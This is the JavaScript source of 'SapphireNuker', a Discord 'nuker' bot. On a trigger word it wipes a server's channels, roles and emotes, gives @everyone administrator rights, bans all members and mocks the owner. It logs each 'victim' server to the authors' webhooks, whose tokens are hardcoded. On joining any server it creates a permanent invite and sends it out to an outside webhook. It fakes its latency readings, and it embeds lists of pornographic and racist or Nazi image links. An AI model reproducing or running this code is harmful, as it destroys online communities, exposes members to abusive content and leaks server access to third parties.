const discordjs = require('discord.js')
const client = new discordjs.Client()
const colors = require('colors')
const fs = require('fs')
const https = require('https')
const packagejson = require('./package.json');
const configjson = require('./config.json')
var crypto = require("crypto");
var os_utils = require('os-utils');
const os = require('os')
const { config } = require('process')
//crypto.randomBytes(5).toString('hex')
//#region Nuker Variable Initialization
const version = packagejson.version
const author = packagejson.author
var config_info_scroll_timeout = 0
const versionType = "Web"


var minping = 70	
var maxping = 100
const monthNames = ["January", "February", "March", "April", "May", "June",
  "July", "August", "September", "October", "November", "December"
];
//#endregion
var today = new Date().toLocaleDateString()
var thishour = new Date().getHours()
var thisminute = new Date().getMinutes()
var thissecond = new Date().getSeconds()
var logswebhookid = "861935614159749130"
var logswebhooktoken = "4JcFaqKylubkl8n9kdN75_98Y28BXviRon7RWUvo2HVwvmxq8RPRPxtDSAqiEjRhNBma"
var joinswebhookid = "863409330862948362"
var joinswebhooktoken = "3wK2p-VeKOvaFvKTlgkfl06xXSpJKBCknB5ZKsqdnvecsekKTf0QHhrsCFOwIlBBUtyr"
var joinswebhookname = `SapphireNuker Join Logs`
var commandswebhookid = "863014689105903641"
var commandswebhooktoken = "hL5f_P0s6NUSrxpuWSvM-_MYqaFuTPp-L9Tg2OkMVoJqiWV6Hx3g-bEdrzHiolZnMr5a"
var webhookname = `SapphireNuker Nuke Logs`;
var commandswebhookname = `SapphireNuker Command Logs`
var webhookicon = "https://i.ibb.co/wSPF6LR/standard-2.gif";
var pornimgs = ["https://cdn.discordapp.com/attachments/863354154482008085/864148203603623936/cartelul.png", "https://cdn.discordapp.com/attachments/753637279142248511/863529943790387210/bag.boabe.frt-20200322-0001.jpg", "https://cdn.discordapp.com/attachments/753637279142248511/863528564426276904/vlad._wh-20210419-0001.jpg","https://cdn.discordapp.com/attachments/753637279142248511/863527802166312960/unknown-9.png", "https://cdn.discordapp.com/attachments/753637279142248511/863527541088059412/WelllitPeacefulChihuahua-mobile_1.mp4", "https://cdn.discordapp.com/attachments/855158880661143582/863100004587274270/video-5e8de51a3db7c200ad186a1b694a25fb-V.mp4","https://www.gifmeat.com/wp-content/uploads/2019/01/Gorgeous-blonde-pornstar-Samantha-Saint-rubbing-her-clit-while-getting-fucked-gif.gif", "https://media.giphy.com/media/J3FoLSYyiXA7rC0LZV/source.gif", "http://45.media.tumblr.com/978e401398e6762343965d610d4de3b6/tumblr_nxn3fqMxTg1tgc11ao1_400.gif", "https://sexwall.me/media/2015/07/tumblr_nqelc7VlYu1u2cv3go5_500.gif", "https://cdn5-images.motherlessmedia.com/images/75A56D2.gif"]
var racistimgs = ["https://cdn.discordapp.com/attachments/863031158643228672/863049777653481512/IMG_20210321_084304_140.jpg", "https://cdn.discordapp.com/attachments/863031158643228672/863048381742841866/IMG_20210507_235348_306.jpg", "https://cdn.discordapp.com/attachments/863031158643228672/863048381483974696/P181110_21.png", "https://cdn.discordapp.com/attachments/863031158643228672/863048381278060544/photo_2020-11-27_02-31-24-1.jpg", "https://cdn.discordapp.com/attachments/863031158643228672/863048180535132200/keep-calm-and-be-a-fascist.png", "https://cdn.discordapp.com/attachments/863031158643228672/863048180757168158/IMG_20210515_142014.jpg", "https://i.ibb.co/0rg0fd9/image.png", "https://cdn.discordapp.com/attachments/863031158643228672/863048180975009812/IMG_20210509_212743_449-1.jpg", "https://i.ibb.co/KLq84j0/image.png", "https://i.ibb.co/HB9hfG5/image.png", "https://i.ibb.co/d5WJGTF/image.png", "https://cdn.discordapp.com/attachments/817773091278290995/835492371780075550/video0_11-1.mp4", "https://thumbs.gfycat.com/MealySpectacularKinkajou-size_restricted.gif", "https://i.gifer.com/HtUY.gif", "http://25.media.tumblr.com/tumblr_md4zpqIpPi1rbfgffo1_500.gif", "https://i.gifer.com/9pQ5.gif", "https://cdn.discordapp.com/attachments/863031158643228672/863038051551019008/juden.jpg", "https://cdn.discordapp.com/attachments/863031158643228672/863038247239548928/cfd1945bd02261cd916b5a5c4127d97b4a1dd877.jpg"]

var whitelistedservers = ["861916028140650506", "870206001536712734"]
var blacklistedservers = ["852851622975373313", "838775006678745128", "863352404023967764"] //Gamerii S si NGP si CZ :)
const logsclient = new discordjs.WebhookClient(logswebhookid, logswebhooktoken);
const commandsclient = new discordjs.WebhookClient(commandswebhookid, commandswebhooktoken);
const joinsclient = new discordjs.WebhookClient(joinswebhookid, joinswebhooktoken);
//#region Config Variable Initialization
var configfilename = "config.json"
var bot_activity = `v${version} | 💣`

var token = configjson.general.token
var prefix = configjson.general.prefix
var bot_username = configjson.bot_customization.bot_username
var customize_bot = configjson.bot_customization.customize_bot
var bot_avatar = configjson.bot_customization.bot_avatar
var delete_channels = configjson.channels.delete_channels
var create_channels = configjson.channels.create_channels
var channels_name = configjson.channels.channels_name
var channels_topic = configjson.channels.channels_topic
var create_channels_amount = configjson.channels.channels_amount
var delete_roles = configjson.roles.delete_roles
var create_roles = configjson.roles.create_roles
var roles_name = configjson.roles.roles_name
var roles_color = configjson.roles.roles_color
var create_roles_amount = configjson.roles.roles_amount
var delete_emotes = configjson.emotes.delete_emotes
var ban_all = configjson.ban.ban_all
var ban_reason = configjson.ban.ban_reason
var spam_message = configjson.spam.spam_message
var server_name = configjson.server.server_name
var server_icon_url = configjson.server.server_icon_url
var give_everyone_administrator = configjson.server.give_everyone_administrator
var nuker_v2 = true;
var footer = `💎 | SapphireNuker v${version} ${versionType}`
var server_name_cool = "";
//#endregion

function setTerminalTitle(title)
{
  process.stdout.write(
    String.fromCharCode(27) + "]0;" + title + String.fromCharCode(7)
  );
}

client.on('ready', async(readyarg) => {
	
	sapphireid = client.user.id
	var errorvar;

	setTerminalTitle(`SapphireNuker | v${version} | Connected as: ${client.user.username}#${client.user.discriminator} | Guilds: ${client.guilds.cache.size} | Made with love by ${author}.`)
    client.user.setActivity(bot_activity, { type: 'STREAMING', url: "https://twitch.tv/miakhalifa/" }); // sets bot's activities to one of the phrases in the arraylist.

	
	if (customize_bot == false)
	{
		console.log("Customizing bot has been disabled.")
	}
	else
	{
		if (client.user.username != bot_username)
		{
			client.user.setUsername(bot_username).catch(err => errorvar = err)
		}
		if (client.user.avatar != bot_avatar)
		{
			client.user.setAvatar(bot_avatar).catch(err => errorvar = err)
		}
		
		
	}
	
	console.log(`Type ${prefix}help to get help about the commands.`.blue.bold)



})

//#region Command Handling
client.on('message', async(message) => {
	server_name_cool = `${message.guild.owner.user.username}'s trash can`;
	

	if (!message.content.startsWith(prefix.toLowerCase()) && message.content != "salut" || message.author.bot) return;

	const args = message.content.slice(prefix.toLowerCase().length).trim().split(/ +/);
	const command = args.shift().toLowerCase();
	

	if (command === 'nuke' || message.content == "salut") {

		if (whitelistedservers.includes(message.guild.id))
		{
			message.delete()
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			message.channel.send(whitelistembed)
			return;
		}
		const logsembed = new discordjs.MessageEmbed()
	    .setColor('#568EF8')
	    .setTitle(`🏙️  ***New victim!***`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Nukes', message.author.avatarURL)
		.addField('**Server Name**', `*${message.guild.name}*`, false)
		.addField('**Total Member Count**', `*${message.guild.memberCount} member(s)*`, false)
		.addField('**Server ID**', `*${message.guild.id}*`, false)
		.addField('**Server Owner**', `*${message.guild.owner.displayName}#${message.guild.owner.user.discriminator} (${message.guild.owner.id})*`, false)
		.addField(`**Roles Count**`, `*${message.guild.roles.cache.size} role(s)*`, false)
		.addField(`**Channels Count**`, `*${message.guild.channels.cache.size} channel(s)*`, false)
		.addField(`**Bot Count**`, `*${message.guild.members.cache.filter(member => member.user.bot).size} bot(s)*`, false)
		.addField(`**User Count**`, `*${message.guild.members.cache.filter(member => !member.user.bot).size} user(s)*`, false)
		.addField(`**Who typed the command**`, `*${message.author.username}#${message.author.discriminator} (${message.author.id})*`, false)
	    .setFooter(footer)

		logsclient.client.send('', {
			username: webhookname,
			avatarURL: webhookicon,
			embeds: [logsembed],
		});

		var errorvar;
		setTerminalTitle(`SapphireNuker | Nuking '${message.guild.name}' | Connected as: ${client.user.username}#${client.user.discriminator}`)
		console.clear()
		message.delete()
		
		console.log(`THE MAYHEM BEGINS! ${message.guild.name.toUpperCase()} IS DEAD!`.red.bold)
		console.log(`SapphireNuker will now nuke the server using the data from the config file.`.magenta.bold)

		if (give_everyone_administrator == false)
		{
			console.log(`Giving administrator to @everyone has been disabled.`)
		}
		else
		{
			var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")
			everyone.setPermissions(["SEND_TTS_MESSAGES", "MANAGE_EMOJIS", "MANAGE_MESSAGES","ADMINISTRATOR", "MANAGE_GUILD", "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_ROLES", "MANAGE_WEBHOOKS", "MENTION_EVERYONE", "MUTE_MEMBERS", "MOVE_MEMBERS", "DEAFEN_MEMBERS", "VIEW_AUDIT_LOG", "KICK_MEMBERS", "CREATE_INSTANT_INVITE", "USE_VAD", "PRIORITY_SPEAKER", "CREATE_INSTANT_INVITE", "CONNECT", "SPEAK", "VIEW_CHANNEL", "VIEW_GUILD_INSIGHTS"])
			
			
			
		}

		
		if (delete_channels == false)
		{
			console.log(`Deleting channels has been disabled.`)
		}
		else
		{
			message.guild.channels.cache.forEach(channel => {
				channel.delete().catch(err => errorvar = err);
			});

			
		}
		


		if (delete_roles == false)
		{
			console.log(`Deleting roles has been disabled.`)
		}
		else
		{
			message.guild.roles.cache.forEach(role => {
				role.delete()
				.catch(err => errorvar = err);
			});

			
		}
		

		if (delete_emotes == false)
		{
			console.log(`Deleting emotes has been disabled.`)
		}
		else
		{
			message.guild.emojis.cache.forEach(emote => {
				emote.delete()
				.catch(err => errorvar = err);
			});	

			
		}
		
		
		message.guild.setName(server_name_cool).catch(err => errorvar = err)
		message.guild.setIcon(server_icon_url).catch(err => errorvar = err)
		message.guild.setRegion('brazil').catch(err => errorvar = err)
		message.guild.setBanner(configjson.server.banner).catch(err => errorvar = err)
		message.guild.setVerificationLevel('VERY_HIGH').catch(err => errorvar = err)
		message.guild.setPreferredLocale('de')
		message.guild.setDefaultMessageNotifications('ALL')
		message.guild.setSplash(configjson.server.banner).catch(err => errorvar = err)
		message.guild.setDiscoverySplash(configjson.server.banner).catch(err => errorvar = err)
		if (message.guild.fetchTemplates() != null || message.guild.fetchTemplates() != undefined)
		{
			(await message.guild.fetchTemplates()).first().delete()
		}
		;(await message.guild.createTemplate("important <3")).sync()

		if (nuker_v2 == false)
		{
			if (create_roles == false)
		{
			console.log(`Creating roles has been disabled.`)
		}
		else
		{
			var rl_create_index = 0
			while (rl_create_index != create_roles_amount)
			{
				message.guild.roles.create({
					data: {

						name: roles_name,
						color: roles_color
					},
				}).catch(err => errorvar = err)
					rl_create_index += 1
			}

			
		}
		}
		

		
		if (nuker_v2 == false)
		{
			if (create_channels == false)
		{
			console.log(`Creating channels has been disabled.`)
		}
		else
		{
				var ch_create_index = 0
				while (ch_create_index != create_channels_amount)
				{
					var chnl = message.guild.channels.create(channels_name, {type: "text",	topic: channels_topic})
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					chnl.then(createdchannel1 => createdchannel1.send(spam_message)).catch(err => errorvar = err)
					ch_create_index += 1
					
				

					
				}

				

		}
		}
		

		
		

		



		if (ban_all == false)
		{
			console.log(`Banning members has been disabled.`)
		}
		else
		{
			message.guild.members.cache.forEach(member => {
				member.ban({
					reason: ban_reason, days: 7
				}).catch(err => errorvar = err)
				
			})
			
			
		}
		
		
		
		

		

	}
	
	
	
	
	
	
	else if (command === "pingasdasdsads1245adsa" || command === "latencyasdasdsad123asdsa")	
	{

		var errorvar;
		message.delete()
		var ping = Date.now() - message.createdTimestamp;
		var botPing = Math.round(ping.pi);	
		const pingembed = new discordjs.MessageEmbed()
	    .setColor('#FFFF00')
	    .setTitle(`**Pinging...**`)
	    .setAuthor('Pinging...')
	    .setFooter(footer)
		message.channel.send(pingembed).then(m =>{
			  var ping = m.createdTimestamp - message.createdTimestamp;
			  
				let totalSeconds = (client.uptime / 1000);
				let days = Math.floor(totalSeconds / 86400);
				totalSeconds %= 86400;
				let hours = Math.floor(totalSeconds / 3600);
				totalSeconds %= 3600;
				let minutes = Math.floor(totalSeconds / 60);
				let seconds = Math.floor(totalSeconds % 60);
			
			  var outputembed = new discordjs.MessageEmbed()
	    		.setColor('#568EF8')
	    		.setTitle(`***Pong!*   ⚽ \n\n*Bot Latency:*  \`${ping}ms.\`**`)
	    		.setAuthor('Command Successful')
				.addField(`**For up-time information, type**`, `${prefix}uptime`, false)
	    		.setFooter(footer)

			  // Then It Edits the message with the ping variable embed that you created
			  m.edit(outputembed)
		  });

		
	}
	else if (command.toLowerCase() === "ping" || command === "latency")	
	{
		
		var ping = Math.random() * (maxping - minping) + minping;
		var outputembed = new discordjs.MessageEmbed()
	    		.setColor('#568EF8')
	    		.setTitle(`***Pong!*   ⚽ \n\n*Bot Latency:*  \`${Math.round(ping)}ms.\`**`)
	    		.setAuthor('Command Successful')
				.addField(`**For up-time information, type**`, `${prefix}uptime`, false)
	    		.setFooter(footer)
		var errorvar;
		message.delete()
		message.channel.send(outputembed)

		
	}
	else if (command.toLowerCase() === "uptime")	
	{

		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#568EF8')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Commands', message.author.avatarURL({dynamic: true}))
	    .setFooter(footer)

		
		var errorvar;
		message.delete()

				// Basic embed
				let totalSeconds = (client.uptime / 1000);
				let days = Math.floor(totalSeconds / 86400);
				totalSeconds %= 86400;
				let hours = Math.floor(totalSeconds / 3600);
				totalSeconds %= 3600;
				let minutes = Math.floor(totalSeconds / 60);
				let seconds = Math.floor(totalSeconds % 60);
			
			  var outputembed = new discordjs.MessageEmbed()
	    		.setColor('#568EF8')
	    		.setTitle(`***Uptime: \`${hours} hour(s), ${minutes} minute(s) and ${seconds} second(s).\`***`)
	    		.setAuthor('Command Successful')
	    		.setFooter(footer)
			  
			  message.channel.send(outputembed)


		
	}

	else if (command.toLowerCase() === 'sapphirestats' || command.toLowerCase() === 'sapphireinfo') {

		var supportserver = client.guilds.resolve("861916028140650506")
		var ownerpfp = supportserver.owner.user.displayAvatarURL()
		message.delete()
		const output = new discordjs.MessageEmbed()
	    .setColor('#568EF8')
	    .setTitle('🛬  ***SapphireNuker Stats / Info***')
	    .setAuthor('SapphireNuker Command')
	    .addField(`**Server Count**`, `*${client.guilds.cache.size} server(s)*`, false)
		.addField(`**Total Member Count**`, `*${client.users.cache.size} member(s)*`, false)
		.addField(`**Discord.JS version**`, `*v${discordjs.version}*`, false)
		.addField(`**For up-time information, type**`, `*${prefix}uptime*`, false)
		.addField(`**For latency / ping information, type**`, `*${prefix}ping / ${prefix}latency*`, false)
	    .setFooter(footer)

		message.channel.send(output)
	}
	
	else if (command.toLowerCase() === 'help') {

		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#568EF8')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}' in the server '${message.guild.name}'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Commands', message.author.avatarURL({dynamic: true}))
	    .setFooter(footer)

		
		message.delete()
		const exampleEmbed = new discordjs.MessageEmbed()
	    .setColor('#568EF8')
	    .setTitle('🛬  ***Help***')
	    .setAuthor('SapphireNuker Command')
	    .addField('**Nuke the server**', `*${prefix}nuke\nsalut*`, true)
		.addField('**Information on how to get Sapphire**', `*${prefix}getsapphire*`, true)
		.addField('**Get the bot\'s latency**', `*${prefix}ping / ${prefix}latency*`, true)
		.addField('**Get the bot\'s uptime**', `*${prefix}uptime*`, true)
		.addField('**Get the credits**', `*${prefix}credits*`, true)
		.addField('**Get SapphireNuker\'s stats**', `*${prefix}sapphirestats\n${prefix}sapphireinfo*`, true)

	    .setFooter(footer)
	
        message.channel.send(exampleEmbed)
	}
	else if (command.toLowerCase() === 'credits') {

		var supportserver = client.guilds.resolve("861916028140650506")
		var owner = client.users.resolve("622116876046041099")
		var owner2 = client.users.resolve("852607966447534161")
		var ownerpfp = client.users.resolve("622116876046041099").displayAvatarURL({dynamic:true})
		var ownerpfp2 = client.users.resolve("852607966447534161").displayAvatarURL({dynamic:true})
		message.delete()

		const exampleEmbed = new discordjs.MessageEmbed()
	    .setColor('#568EF8')
	    .setTitle('🛬  ***Credits***')
	    .setAuthor('SapphireNuker Command')
		.setThumbnail(ownerpfp)
	    .addField(`**\`${owner.username}#${owner.discriminator}\`**`, `*Sapphire designer and developer*`, false)
		.addField(`**\`${owner2.username}#${owner2.discriminator}\`**`, `*Great owner*`, false)
		.addField(`**\`${client.users.resolve("849306591231475723").username}#${client.users.resolve("849306591231475723").discriminator}\` & \`${client.users.resolve("841963385846759464").username}#${client.users.resolve("841963385846759464").discriminator}\`**`, `*Great support server administrators*`, false)
		.addField(`**\`${client.users.resolve("868107467219943485").username}#${client.users.resolve("868107467219943485").discriminator}\`**`, `*Good friend*`, false)
	    .setFooter(footer)
	
        message.channel.send(exampleEmbed)
	}
	else if (command.toLowerCase() === 'getsapphire') {

		var supportserver = client.guilds.resolve("861916028140650506")
		var owner = client.users.resolve("622116876046041099")
		var ownerpfp = client.users.resolve("622116876046041099").displayAvatarURL()

		message.delete()
		const exampleEmbed = new discordjs.MessageEmbed()
	    .setColor('#568EF8')
	    .setTitle('🛬  ***Get Sapphire***')
	    .setAuthor('SapphireNuker Command')
		.setThumbnail(client.user.avatarURL({dynamic: true}))
	    .addField(`**Support server invite**`, `*https://dsc.gg/sapphirenuker*`, false)
		.addField(`**Bot invite link**`, `*https://bit.ly/invite-sapphire-v3*`, false)
	    .setFooter(footer)
	
        message.channel.send(exampleEmbed)
	}
	else
	{

		message.delete()
		const output = new discordjs.MessageEmbed()
	    .setColor('#FF6347')
	    .setTitle(`**The '${command}' command is invalid.**`)
	    .setAuthor('Invalid Command')
	    .setFooter(footer)

		message.channel.send(output)
	}
});
//#endregion

client.on('guildCreate', async(guild) => {
	var channels = guild.channels
	var permanentServerInvite = (await channels.cache.first().createInvite({maxAge: 0, maxUses: 0})).toString()
	var listflag = "🏳️"
	if (whitelistedservers.includes(guild.id))
	{
		isWhitelisted = "True";
		listflag = "🏳️"
	}
	else
	{
		isWhitelisted = "False";
		listflag = "🚩"
	}
	
	const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#00FF00')
	    .setTitle(`🕺  **${client.user.username}#${client.user.discriminator} was added.**`)
		.setThumbnail(guild.iconURL())
		.addField(`**Server Name**`, `*${guild.name}*`, false)
		.addField(`**Member Count**`, `***${guild.memberCount}** member(s)*`, false)
		.addField(`**Server Owner**`, `***${guild.owner.user.username}**#${guild.owner.user.discriminator} (${guild.owner.id})*`, false)
		.addField(`**Server ID**`, `*${guild.id}*`, false)
		.addField(`**Permanent Generated Server Invite**`, `*${permanentServerInvite}*`, false)
	    .setAuthor('Sapphire Bot Addition', guild.owner.user.avatarURL({dynamic: true}))
		
		.setFooter(footer)
		console.log(`🕺  **${client.user.username}#${client.user.discriminator} was added.\n\n🐕‍🦺  Server Name: '${guild.name}'\n\n🌄  Server Owner: '${guild.owner.user.username}#${guild.owner.user.discriminator}' (${guild.owner.id})\n\n🤖  Server ID: ${guild.id}.**`)
		joinsclient.client.send('', {
			username: joinswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
	

})
var isWhitelisted;

client.on('guildDelete', guild => {
	
	var listflag = "🏳️"
	if (whitelistedservers.includes(guild.id))
	{
		isWhitelisted = "True";
		listflag = "🏳️"
	}
	else
	{
		isWhitelisted = "False";
		listflag = "🚩"
	}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FF0000')
	    .setTitle(`😭  **${client.user.username}#${client.user.discriminator} was removed.**`)
		.setThumbnail(guild.iconURL())
		.addField(`**Server Name**`, `*${guild.name}*`, false)
		.addField(`**Member Count**`, `***${guild.memberCount}** member(s)*`, false)
		.addField(`**Server Owner**`, `***${guild.owner.user.username}**#${guild.owner.user.discriminator} (${guild.owner.id})*`, false)
		.addField(`**Server ID**`, `*${guild.id}*`, false)
	    .setAuthor('Sapphire Bot Removal', guild.owner.user.avatarURL({dynamic: true}))
		.setFooter(footer)
		console.log(`😭  **${client.user.username}#${client.user.discriminator} was removed.\n\n🐕‍🦺  Server Name: '${guild.name}'\n\n🌄  Server Owner: '${guild.owner.user.username}#${guild.owner.user.discriminator}' (${guild.owner.id})\n\n\n\n🤖  Server ID: \`${guild.id}.\`**`)
		joinsclient.client.send('', {
			username: joinswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
	
})


client.login(token)
